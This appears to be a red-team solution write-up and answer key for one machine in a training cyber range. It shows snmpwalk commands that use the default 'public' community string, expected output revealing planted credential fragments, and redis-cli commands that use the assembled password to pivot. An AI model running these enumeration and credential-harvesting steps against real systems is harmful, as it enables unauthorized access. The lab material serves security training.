# solve_red.md — M4 · itgw-netmgmt
## Red Team Solution Writeup
**Range:** RNG-IT-01 · Corporate Gateway
**Machine:** M4 — Network Management Host
**Vulnerability:** SNMP v2c Weak Community String + Planted Credential OIDs
**MITRE ATT&CK:** T1046 (Network Service Discovery) · T1040 (Network Sniffing context) · T1552 (Unsecured Credentials)
**Severity:** High
**Kill Chain Stage:** Discovery → Credential Access

---

## Objective
Enumerate the SNMP service on `203.x.x.x:161` using the default community string, walk the private enterprise MIB tree to discover planted credential fragments, assemble the Redis service account credential, and use it to pivot to M5.

---

## Environment
| Item | Value |
|---|---|
| Target IP | `203.x.x.x` |
| Service Port | `161/UDP` |
| Protocol | SNMPv2c |
| Pivot From | M3 admin panel (SNMP host/port/version disclosed) |

---

## Step-by-Step Exploitation

### Step 1 — Confirm SNMP Service

```bash
nmap -sU -p 161 203.x.x.x -sV
# OR
snmpwalk -v2c -c public 203.x.x.x system
```

Expected: system OIDs returned — confirms `public` community string is valid.

### Step 2 — Walk the Standard MIB Tree

```bash
# Get system information
snmpwalk -v2c -c public 203.x.x.x .1.3.6.1.2.1.1
```

Note the `sysDescr`, `sysName`, `sysContact` — confirms this is the PUL network management agent.

### Step 3 — Discover Private Enterprise OIDs

```bash
# Walk the NET-SNMP-EXTEND-MIB tree (where extend directives live)
snmpwalk -v2c -c public 203.x.x.x .1.3.6.1.4.1.8072.1.3.2

# OR walk the full private enterprise subtree directly
snmpwalk -v2c -c public 203.x.x.x .1.3.6.1.4.1.99999
```

Expected output:
```
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."pul-segment-info" = STRING: Target: 203.x.x.x/24 (IT-Ops internal) via gateway 203.x.x.x
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."pul-cred-part1"   = STRING: redis-svc-user:r3d
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."pul-cred-part2"   = STRING: 1s-cache@PUL!2024
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."pul-cache-host"   = STRING: Cache endpoint: 203.x.x.x port 6379
```

### Step 4 — Assemble the Credential

Concatenate `pul-cred-part1` and `pul-cred-part2`:
```
redis-svc-user:r3d + 1s-cache@PUL!2024
= redis-svc-user:r3d1s-cache@PUL!2024
```

Extract the Redis endpoint from `pul-cache-host`:
- **Host:** `203.x.x.x`
- **Port:** `6379`

### Step 5 — Document and Pivot

The assembled credential `redis-svc-user:r3d1s-cache@PUL!2024` and cache host `203.x.x.x:6379` are the pivot artifacts for **M5 — itgw-cache**.

Test connectivity:
```bash
redis-cli -h 203.x.x.x -p 6379 -a 'r3d1s-cache@PUL!2024' ping
# Expected: PONG (if M5 is configured with auth) OR just:
redis-cli -h 203.x.x.x -p 6379 ping
# PONG (if M5 has no auth — the actual vulnerability of M5)
```

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Discovery | Network Service Discovery | T1046 |
| Discovery | Remote System Discovery | T1018 |
| Credential Access | Unsecured Credentials | T1552 |
| Collection | Data from Configuration Repository | T1602.002 |
